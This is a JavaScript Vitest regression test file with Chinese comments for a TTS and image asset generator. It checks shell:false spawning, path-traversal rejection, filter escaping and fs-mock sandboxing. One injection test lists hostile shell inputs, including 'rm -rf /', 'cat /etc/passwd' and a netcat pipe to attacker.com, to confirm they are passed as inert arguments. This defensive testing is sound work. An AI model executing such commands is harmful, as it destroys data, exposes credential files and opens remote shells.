// @ts-check
/**
 * AssetGenerator 安全回归测试 (P0-1)
 *
 * 验证命令注入漏洞已修复：
 *   - spawn 调用必须使用 shell: false
 *   - 恶意文本不能触发任意 shell 命令
 */
// vitest 全局注入 vi, describe, it, expect, beforeEach — 无需 require

const { EventEmitter } = require('events')

// 用 vi.fn 创建 mock spawn，捕获调用参数
const mockSpawn = vi.fn((cmd, args, opts) => {
  const proc = new EventEmitter()
  setTimeout(() => proc.emit('exit', 1), 0)
  return proc
})

// 项目 test-setup.js 的 __registerMock 通过 Module._load 拦截 CJS require
__registerMock('child_process', {
  spawn: mockSpawn,
  execFile: vi.fn((cmd, args, opts, cb) => {
    if (typeof opts === 'function') cb = opts
    else if (typeof cb !== 'function') cb = () => {}
    cb(new Error('mocked'))
  }),
  execSync: vi.fn(() => ''),
})

// 夹具只对**本测试的沙箱目录**谎报文件系统，沙箱外一律委托真实 fs。
// 原因：__registerMock 经 Module._load 拦截该 realm 里每一个 require('fs')，而
// node_modules/electron/index.js 也在同一 realm 里被真实执行（实测与 vitest.config.js 的
// deps.inline:['electron'] 无关，摘掉它 banner 照样出现，见 docs/deps-inline-electron-evaluation.md）。
// 一律 existsSync()=>false 会让它以为二进制没备好，于是打出
// `Downloading Electron binary...` 并当场 spawn install.js —— 这就是 CI 里那条被记到
// "当时正在跑的用例"名下的下载 banner（#2783 的日志形状，根因由 #2794 归因）。
// 委托只覆盖"读"里第三方模块真正会用的两个动词（existsSync / readFileSync）。statSync 保持原来的
// 固定返回值：把它换成真读会让"不存在的沙箱外路径"从 {size:1024} 变成抛 ENOENT，那是本缺陷之外的
// 新语义漂移，没有东西需要它。写类动词继续全部空转：夹具不得因为"委托"而把东西真的写到磁盘上。
// 沙箱前缀：os.tmpdir() 下带 pid 的独立目录（AGENTS.md「文件系统测试隔离」）。
// 用共享固定名会让并行 worker 互相删对方的文件，而那是"间歇红"的形状。
const nodeOs = require('node:os')
const realFs = require('node:fs')
const TTS_SANDBOX = require('node:path').join(nodeOs.tmpdir(), 'multi-publish-asset-gen-' + process.pid)
// 夹具只对**本测试的沙箱目录**谎报文件系统，沙箱外一律委托真实 fs。
// 原因：__registerMock 经 Module._load 拦截该 realm 里每一个 require(fs)，而
// node_modules/electron/index.js 也在同一 realm 里被真实执行（实测与 deps.inline:[electron] 无关，
// 摘掉它 banner 照样出现，见 docs/deps-inline-electron-evaluation.md）。一律 existsSync()=>false 会让它以为二进制没备好，于是打出
// Downloading Electron binary... 并当场 spawn install.js —— 这就是 CI 里那条被记到
// "当时正在跑的用例"名下的下载 banner（#2783 的日志形状，根因由 #2794 归因）。
// 判定必须按**路径段**比：裸 startsWith 会把 <沙箱>-evil 这种近名目录判进沙箱，
// 于是夹具对一个真实存在的目录持续谎报"不存在"，而没有任何用例会因此变红。
const isSandboxPath = (target) => {
  const normalized = String(target).replace(/\\/g, '/')
  const sandbox = TTS_SANDBOX.replace(/\\/g, '/')
  return normalized === sandbox || normalized.startsWith(sandbox + '/')
}
// 委托只覆盖第三方模块真正会用到的两个读动词（existsSync / readFileSync）。
// statSync 保持原固定返回值：换成真读会让"不存在的沙箱外路径"从 {size:1024} 变成抛 ENOENT，
// 那是本缺陷之外的新语义漂移，没有任何东西需要它。写类动词继续全部空转。
__registerMock('fs', {
  existsSync: vi.fn((target) => (isSandboxPath(target) ? false : realFs.existsSync(target))),
  mkdirSync: vi.fn(),
  statSync: vi.fn(() => ({ size: 1024 })),
  writeFileSync: vi.fn(),
  readFileSync: vi.fn((target, ...rest) => (isSandboxPath(target) ? '' : realFs.readFileSync(target, ...rest))),
  rmSync: vi.fn(),
})

const {
  AssetGenerator,
  buildEdgeTtsScript,
  resolveImageSize,
  escapeDrawtextText,
} = require('./asset-generator')
const { PLACEHOLDER_VOICE_IDS, resolveConcreteVoiceId } = require('./tts-voice-id')

// 辅助：从 mockSpawn.mock.calls 中找 python 调用
function findPythonSpawn() {
  const call = mockSpawn.mock.calls.find(c => c[0] === 'python')
  return call ? { cmd: call[0], args: call[1], opts: call[2] } : undefined
}

describe('AssetGenerator P0-1: command injection prevention', () => {
  beforeEach(() => { mockSpawn.mockClear() })

  it('spawn must use shell: false (not shell: true)', async () => {
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX })
    await gen.generateTTS('hello world', { index: 0 })
    const ttsSpawn = findPythonSpawn()
    expect(ttsSpawn).toBeDefined()
    expect(ttsSpawn.opts.shell).toBe(false)
  })

  it('malicious shell metacharacters are passed as args, not executed', async () => {
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX })
    const maliciousInputs = [
      '"; rm -rf / #',
      '$(whoami)',
      'a && del /F /Q C:\\',
      '`; cat /etc/passwd #',
      '| nc attacker.com 4444',
    ]
    for (const text of maliciousInputs) {
      mockSpawn.mockClear()
      await gen.generateTTS(text, { index: 0 })
      const ttsSpawn = findPythonSpawn()
      expect(ttsSpawn).toBeDefined()
      // 验证恶意文本作为数组参数原样传递，而非被 shell 解释
      expect(ttsSpawn.args).toContain(text)
      expect(ttsSpawn.opts.shell).toBe(false)
    }
  })

  it('cleanText is sliced to 200 chars before passing to spawn', async () => {
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX })
    const longText = 'a'.repeat(500)
    await gen.generateTTS(longText, { index: 0 })
    const ttsSpawn = findPythonSpawn()
    expect(ttsSpawn).toBeDefined()
    const passedText = ttsSpawn.args.find(a => typeof a === 'string' && a.length === 200)
    expect(passedText).toBeDefined()
    expect(passedText.length).toBe(200)
  })

  it('empty text falls back to silence (no spawn call to python)', async () => {
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX })
    mockSpawn.mockClear()
    await gen.generateTTS('', { index: 0 })
    const pythonSpawn = findPythonSpawn()
    // 空文本应直接返回 null，不调用 python
    expect(pythonSpawn).toBeUndefined()
  })

  it('edge-tts 使用可执行的单表达式脚本，不在分号后声明 async def', () => {
    const script = buildEdgeTtsScript()
    expect(script).toContain('asyncio.run')
    expect(script).not.toMatch(/;\s*async\s+def/)
  })

  it('UI 暴露的水彩和极简样式拥有稳定画布尺寸', () => {
    expect(resolveImageSize('16:9', 'watercolor')).toEqual({ width: 1280, height: 720 })
    expect(resolveImageSize('9:16', 'minimalist')).toEqual({ width: 720, height: 1280 })
  })

  it('按安全的 runId 隔离图片和音频输出，并拒绝路径穿越索引', async () => {
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX })
    await gen.generateTTS('hello', { index: '../escape', runId: '../run/id' })
    const ttsSpawn = findPythonSpawn()
    expect(ttsSpawn).toBeDefined()
    const audioPath = ttsSpawn.args.find(
      (arg) => typeof arg === 'string' && /[\\/]tts_0000\.mp3$/.test(arg),
    )
    expect(audioPath).toBeDefined()
    expect(audioPath).toContain('run_id')
    expect(audioPath).not.toContain('..')
    expect(audioPath).toMatch(/tts_0000\.mp3$/)
  })

  it('drawtext 文本会折叠换行并转义滤镜分隔符', () => {
    const escaped = escapeDrawtextText("a:b,c%{x}\nnext")
    expect(escaped).toBe("a\\:b\\,c\\%\\{x\\} next")
  })
})

describe('TTS 词级时间戳（消除事后 whisper ASR）', () => {
  const fsMock = require('fs')

  it('edge-tts 脚本启用 WordBoundary（构造函数参数）并写时间戳 sidecar（argv[6]）', () => {
    const script = buildEdgeTtsScript()
    expect(script).toContain('asyncio.run')
    // 7.x 起 boundary 是 Communicate 构造函数参数（默认 SentenceBoundary），必须显式 WordBoundary
    expect(script).toContain('boundary="WordBoundary"')
    expect(script).toContain('sys.argv[6]')
    expect(script).not.toMatch(/;\s*async\s+def/)
  })

  it('python 退出 0 + sidecar 存在 → 返回 timings 且 duration 来自词尾', async () => {
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX })
    const originalSpawnImpl = mockSpawn.getMockImplementation()
    const originalExists = fsMock.existsSync.getMockImplementation()
    const originalStat = fsMock.statSync.getMockImplementation()
    const originalRead = fsMock.readFileSync.getMockImplementation()
    mockSpawn.mockImplementation((cmd, args, opts) => {
      const proc = new EventEmitter()
      setTimeout(() => proc.emit('exit', 0), 0)
      return proc
    })
    fsMock.existsSync.mockImplementation((p) => String(p).endsWith('.mp3') || String(p).endsWith('.timings.json'))
    fsMock.statSync.mockReturnValue({ size: 48000 })
    fsMock.readFileSync.mockImplementation((p) => {
      if (String(p).endsWith('.timings.json')) {
        return JSON.stringify([
          { text: '你好', start: 0, end: 0.6 },
          { text: '世界', start: 0.6, end: 1.2 },
        ])
      }
      return ''
    })
    try {
      const result = await gen.generateTTS('你好世界', { index: 0 })
      expect(result.code).toBe(0)
      expect(result.data.timings).toEqual([
        { text: '你好', start: 0, end: 0.6 },
        { text: '世界', start: 0.6, end: 1.2 },
      ])
      expect(result.data.duration).toBe(1.5) // 1.2s 词尾 + 0.3s 尾音
      const ttsSpawn = findPythonSpawn()
      expect(ttsSpawn.args[ttsSpawn.args.length - 1]).toMatch(/\.timings\.json$/)
    } finally {
      mockSpawn.mockImplementation(originalSpawnImpl)
      fsMock.existsSync.mockImplementation(originalExists)
      fsMock.statSync.mockImplementation(originalStat)
      fsMock.readFileSync.mockImplementation(originalRead)
    }
  })

  it('provider TTS 返回 subtitle_file → 抓取并解析词级时间戳（毫秒 → 秒）', async () => {
    const fetchImpl = vi.fn(async () => ({
      ok: true,
      async text() {
        return JSON.stringify({
          subtitle: [
            { text: '你好', start_time: 0, end_time: 600 },
            { text: '世界', start_time: 600, end_time: 1200 },
          ],
        })
      },
    }))
    const aiGenerator = {
      generate: vi.fn(async () => ({
        audio: Buffer.from([1, 2, 3]),
        format: 'mp3',
        duration: 1.5,
        subtitleFile: 'https://cdn.minimax.chat/sub.json',
      })),
    }
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX, aiGenerator, fetchImpl })
    const result = await gen.generateTTS('你好世界', { index: 0, voice_provider: 'minimax-tts', voice_id: 'male-qn-qingse' })
    expect(result.code).toBe(0)
    expect(result.data.provider).toBe('minimax-tts')
    expect(result.data.timings).toEqual([
      { text: '你好', start: 0, end: 0.6 },
      { text: '世界', start: 0.6, end: 1.2 },
    ])
    expect(fetchImpl).toHaveBeenCalledWith('https://cdn.minimax.chat/sub.json', expect.objectContaining({ signal: expect.anything() }))
  })

  it('subtitle 抓取失败 → 静默降级（无 timings，不影响音频返回）', async () => {
    const fetchImpl = vi.fn(async () => { throw new Error('ECONNREFUSED') })
    const aiGenerator = {
      generate: vi.fn(async () => ({
        audio: Buffer.from([1, 2, 3]),
        format: 'mp3',
        duration: 1.5,
        subtitleFile: 'https://cdn.minimax.chat/sub.json',
      })),
    }
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX, aiGenerator, fetchImpl })
    const result = await gen.generateTTS('你好世界', { index: 0, voice_provider: 'minimax-tts' })
    expect(result.code).toBe(0)
    expect(result.data.timings).toBeUndefined()
    expect(result.data.duration).toBe(1.5)
  })

  it('subtitle 文件 content-length 超限 → 不读取正文，直接降级（无 timings）', async () => {
    const textSpy = vi.fn(async () => '{"subtitle":[]}')
    const fetchImpl = vi.fn(async () => ({
      ok: true,
      headers: { get: () => String(8 * 1024 * 1024 + 1) },
      text: textSpy,
    }))
    const aiGenerator = {
      generate: vi.fn(async () => ({
        audio: Buffer.from([1, 2, 3]),
        format: 'mp3',
        duration: 1.5,
        subtitleFile: 'https://cdn.minimax.chat/huge.json',
      })),
    }
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX, aiGenerator, fetchImpl })
    const result = await gen.generateTTS('你好世界', { index: 0, voice_provider: 'minimax-tts' })
    expect(result.code).toBe(0)
    expect(result.data.timings).toBeUndefined()
    expect(textSpy).not.toHaveBeenCalled()
  })
})

describe('generateImage provider negative_prompt 透传（2026-08-16 east-asian-face-anchor）', () => {
  it('generateImage 把 opts.negative_prompt 传入 aiGenerator.generate(image) 调用', async () => {
    const aiGenerator = {
      generate: vi.fn(async () => ({
        images: [{ b64_json: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==' }],
      })),
    }
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX, aiGenerator })
    const result = await gen.generateImage('朱蒙站在山脊上眺望', {
      index: 0,
      image_provider: 'openai-image',
      negative_prompt: '西方面孔, 金发',
    })
    expect(result.code).toBe(0)
    expect(aiGenerator.generate).toHaveBeenCalledWith(
      'image',
      'dall-e',
      expect.objectContaining({ negative_prompt: '西方面孔, 金发' }),
    )
  })

  it('未传 negative_prompt 时不带该键（不污染 provider 载荷）', async () => {
    const aiGenerator = {
      generate: vi.fn(async () => ({
        images: [{ b64_json: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==' }],
      })),
    }
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX, aiGenerator })
    const result = await gen.generateImage('prompt', { index: 0, image_provider: 'openai-image' })
    expect(result.code).toBe(0)
    const payload = aiGenerator.generate.mock.calls[0][2]
    expect(payload).not.toHaveProperty('negative_prompt')
  })
})

  it("re-throws ProviderError from _tryProviderTTS for upstream cloned-voice detection", async () => {
    const { ProviderError, ERROR_CODES } = require("./adapters/_base/provider-error")
    const aiGenerator = {
      generate: vi.fn(async () => {
        throw new ProviderError(ERROR_CODES.INVALID_CONFIG, "you dont have access to this voice_id", { providerId: "minimax-multimodal" })
      }),
    }
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX, aiGenerator })
    await expect(gen.generateTTS("hello", {
      index: 0,
      voice_provider: "minimax-multimodal",
      voice_id: "cloned_voice_123",
    })).rejects.toThrow(ProviderError)
    expect(aiGenerator.generate).toHaveBeenCalledWith("tts", "minimax-multimodal", expect.objectContaining({ voice: "cloned_voice_123" }))
  })

  it("returns code -1 for non-ProviderError in _tryProviderTTS catch", async () => {
    const aiGenerator = {
      generate: vi.fn(async () => { throw new Error("generic failure") }),
    }
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX, aiGenerator })
    const result = await gen.generateTTS("hello", { index: 0, voice_provider: "some-provider" })
    expect(result.code).toBe(-1)
    expect(result.message).toContain("some-provider")
  })


describe('夹具不得对同 realm 的第三方模块谎报文件系统（#2794 回归锁）', () => {
  // 本文件顶部把 existsSync 注册成"沙箱内一律 false"，而 node_modules/electron/index.js
  // 就在同一 realm 里被执行（实测与 deps.inline:[electron] 无关，摘掉它 banner 照样出现）—— 于是 require(electron) 读到这个假 fs，
  // 以为二进制没备好，打出 Downloading Electron binary...（CI 上有日志无下载，实测距下一条 11ms）。
  // 这三条锁只锁可观察的事：委托边界正确、写不落盘、banner 不出现。
  const nodePath = require('node:path')

  it('沙箱内即使文件真实存在也必须谎报；近名目录与沙箱外必须委托真读', () => {
    const fsMocked = require('fs')
    const insideFile = nodePath.join(TTS_SANDBOX, 'real.txt')
    const evilSibling = TTS_SANDBOX + '-evil'
    try {
      realFs.mkdirSync(TTS_SANDBOX, { recursive: true })
      realFs.writeFileSync(insideFile, 'real')
      // 自证：文件真的存在。少了这一行，下一条"夹具必须报 false"就是恒真的空话
      // （本文件 M-3 反证第一轮抓到的正是这种恒真）。
      expect(realFs.existsSync(insideFile)).toBe(true)
      expect(fsMocked.existsSync(insideFile)).toBe(false)
      // 段界：<沙箱>-evil 只差结尾几个字符，但它不是沙箱 —— 必须委托真读，所以存在的目录要报 true。
      realFs.mkdirSync(evilSibling, { recursive: true })
      expect(realFs.existsSync(evilSibling)).toBe(true)
      expect(fsMocked.existsSync(evilSibling)).toBe(true)
      // 沙箱外的真实读取路径同样委托：这两条是给"整个委托分支被摘掉"准备的独占红出口。
      expect(fsMocked.existsSync(nodePath.join(process.cwd(), 'package.json'))).toBe(true)
      const pathTxt = nodePath.join(nodePath.dirname(require.resolve('electron')), 'path.txt')
      expect(typeof fsMocked.readFileSync(pathTxt, 'utf-8')).toBe('string')
      expect(fsMocked.readFileSync(pathTxt, 'utf-8').length).toBeGreaterThan(0)
    } finally {
      realFs.rmSync(TTS_SANDBOX, { recursive: true, force: true })
      realFs.rmSync(evilSibling, { recursive: true, force: true })
    }
  })

  it('委托只覆盖读：写类动词拿到沙箱外路径也必须空转，绝不落盘', () => {
    const fsMocked = require('fs')
    const scratch = realFs.mkdtempSync(nodePath.join(nodeOs.tmpdir(), 'mp-agg-write-' + process.pid + '-'))
    try {
      // 先证明这个目录在夹具眼里是"真"的（沙箱外、委托生效），否则下面的"没写出来"不成立。
      expect(fsMocked.existsSync(scratch)).toBe(true)
      fsMocked.writeFileSync(nodePath.join(scratch, 'forbidden.txt'), 'should not be written')
      fsMocked.mkdirSync(nodePath.join(scratch, 'forbidden-dir'))
      expect(realFs.existsSync(nodePath.join(scratch, 'forbidden.txt'))).toBe(false)
      expect(realFs.existsSync(nodePath.join(scratch, 'forbidden-dir'))).toBe(false)
    } finally {
      realFs.rmSync(scratch, { recursive: true, force: true })
    }
  })

  it('夹具激活时 require("electron") 不得产出下载 banner，且必须解析到真实存在的可执行文件', () => {
    const electronId = require.resolve('electron')
    const exeName = process.platform === 'win32' ? 'electron.exe' : 'electron'
    const exePath = nodePath.join(nodePath.dirname(electronId), 'dist', exeName)
    if (!realFs.existsSync(exePath)) {
      throw new Error('前置条件不成立：node_modules/electron/dist 未备好，请先跑 node scripts/ensure-electron.js —— 本用例不得静默跳过')
    }
    const captured = []
    const previousEntry = require.cache[electronId]
    const originalLog = console.log
    const originalWrite = process.stdout.write
    let value
    let thrown = null
    try {
      delete require.cache[electronId]
      // 两个通道都录（banner 现在由 console.log 打，但若哪天改走 stdout 单通道锁会失明），
      // 又都原样转发 —— 录证据不等于把证据藏起来。
      console.log = (...args) => {
        captured.push(args.join(' '))
        return originalLog.apply(console, args)
      }
      process.stdout.write = (chunk, ...rest) => {
        captured.push(String(chunk))
        return originalWrite.call(process.stdout, chunk, ...rest)
      }
      value = require('electron')
    } catch (error) {
      thrown = error
    } finally {
      console.log = originalLog
      process.stdout.write = originalWrite
      // 用例改了模块缓存就必须还原：否则同 realm 后续每次 require(electron) 都会重跑 index.js。
      if (previousEntry) require.cache[electronId] = previousEntry
      else delete require.cache[electronId]
    }
    expect(captured.filter((line) => line.includes('Downloading Electron binary'))).toEqual([])
    expect(thrown).toBeNull()
    expect(realFs.existsSync(String(value))).toBe(true)
  })
})

// 2026-10-23 实测补：edge-tts 路径没有过滤「未指定音色」的占位值。
// 上游 story2video-stages.js 取音色时的兜底是字符串 'default'
// （firstDefined(params.voiceId, stage.options?.voiceId, 'default')），
// provider 路径早就把占位值过滤掉，但 edge-tts 路径原样透传 ⇒ edge-tts 抛
// `ValueError: Invalid voice 'default'` ⇒ TTS 静默降级为 3 秒静音，
// **成片完全没有旁白**且界面侧看不出异常。
describe('TTS 音色占位值不得当成真实音色名透传（2026-10-23）', () => {
  it('resolveConcreteVoiceId 把 default/male/female-soft 一律判为「未指定」', () => {
    expect(resolveConcreteVoiceId('default')).toBeNull()
    expect(resolveConcreteVoiceId('male')).toBeNull()
    expect(resolveConcreteVoiceId('female-soft')).toBeNull()
    expect(resolveConcreteVoiceId('')).toBeNull()
    expect(resolveConcreteVoiceId('   ')).toBeNull()
    expect(resolveConcreteVoiceId(null)).toBeNull()
    expect(resolveConcreteVoiceId(undefined)).toBeNull()
    // 真实音色名原样保留
    expect(resolveConcreteVoiceId('zh-CN-XiaoxiaoNeural')).toBe('zh-CN-XiaoxiaoNeural')
    expect(resolveConcreteVoiceId(' mimo-clone-1234 ')).toBe('mimo-clone-1234')
  })

  it('占位值集合是单一事实源（provider 路径与 edge-tts 路径共用）', () => {
    expect([...PLACEHOLDER_VOICE_IDS].sort()).toEqual(['default', 'female-soft', 'male'])
  })

  it('edge-tts 路径遇到 voice_id=default 时必须回落到真实音色名而不是把 default 传给 edge-tts', async () => {
    const gen = new AssetGenerator({ outputDir: TTS_SANDBOX })
    const originalSpawnImpl = mockSpawn.getMockImplementation()
    mockSpawn.mockImplementation((cmd, args, opts) => {
      const proc = new EventEmitter()
      setTimeout(() => proc.emit('exit', 1), 0)
      return proc
    })
    try {
      await gen.generateTTS('测试文本', { voice_id: 'default', index: 0 })
      const call = mockSpawn.mock.calls.find(c => Array.isArray(c[1]) && c[1].some(a => String(a).includes('zh-CN-XiaoxiaoNeural')))
      expect(call).toBeTruthy()
      // 传给 edge-tts 的音色名不得是占位值
      const voiceArg = call[1].find(a => typeof a === 'string' && a.startsWith('zh-CN-'))
      expect(voiceArg).toBe('zh-CN-XiaoxiaoNeural')
      expect(call[1]).not.toContain('default')
    } finally {
      mockSpawn.mockImplementation(originalSpawnImpl)
    }
  })
})
